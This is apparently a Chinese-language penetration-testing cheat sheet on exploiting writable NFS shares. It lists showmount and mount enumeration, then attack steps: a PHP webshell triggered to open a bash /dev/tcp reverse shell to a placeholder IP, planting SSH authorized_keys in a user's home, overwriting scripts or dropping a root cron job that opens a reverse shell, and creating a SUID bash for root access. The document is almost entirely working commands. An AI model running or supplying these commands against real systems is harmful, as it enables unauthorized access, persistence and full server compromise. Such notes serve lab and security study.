nfs只无法在共享目录里面执行cd命令

showmount -e ip
查看当前被挂载的目录
showmount -a ip
查看有哪些客户端正在读写挂载目录
showmount -d ip
查看哪些目录正在被读写,不列客户端
mount -nfs 服务器ip:挂载目录 本地目录
将对方的共享NFS挂载到自己电脑上的目录
touch /本地目录/文件
ls -l /本地目录/文件
检查文件权限与属主,如果是root继续后面的步骤

如果是web目录
# 1. 确认服务器跑 web(nmap 看 80/443)
# 2. 写 webshell
echo '<?php system($_GET["c"]); ?>' > ./nfs/shell.php
# 3. 浏览器/nc 访问触发
curl 'http://192.168.1.6/shell.php?c=id'
# 4. 直接反弹
curl 'http://192.168.1.6/shell.php?c=bash%20-i%20>%26%20/dev/tcp/你IP/4444%200>%261'

如果是用户home目录(需要root)
# 1. 在本机Kali生成密钥
ssh-keygen -t rsa
# 2. 往共享里塞公钥
mkdir -p ./nfs/.ssh
cat ~/.ssh/id_rsa.pub >> ./nfs/.ssh/authorized_keys
./nfs/.ssh/authorized_keys
                ↓ 实际等于
服务器上的:     /home/user/.ssh/authorized_keys
chmod 700 ./nfs/.ssh
chmod 600 ./nfs/.ssh/authorized_keys
# 3. SSH 上去
ssh -i ~/.ssh/id_rsa user@ip

如果共享目录里有定时脚本或定时任务表
# 3a. 覆盖已有脚本（如果脚本可写）
echo 'bash -i >& /dev/tcp/你的IP/4444 0>&1' > ./nfs/backup.sh
# 或 3b. 往 cron.d 丢任务
echo '* * * * * root bash -i >& /dev/tcp/你的IP/4444 0>&1' > ./nfs/mytask

如果是普通目录(需要root)
# 4a. 造 SUID bash
cp /bin/bash ./nfs/rootbash
chmod u+s ./nfs/rootbash
ls -l ./nfs/rootbash      # 确认 -rwsr-xr-x
# 4b. 但还需要"能在服务器上执行它"的通道——比如：
#     - 你有别的洞拿了 SSH / webshell
#     - 或者共享目录本身能被某个服务调用
# 然后在服务器上执行：
/xxx/rootbash -p
id                        # uid=0(root)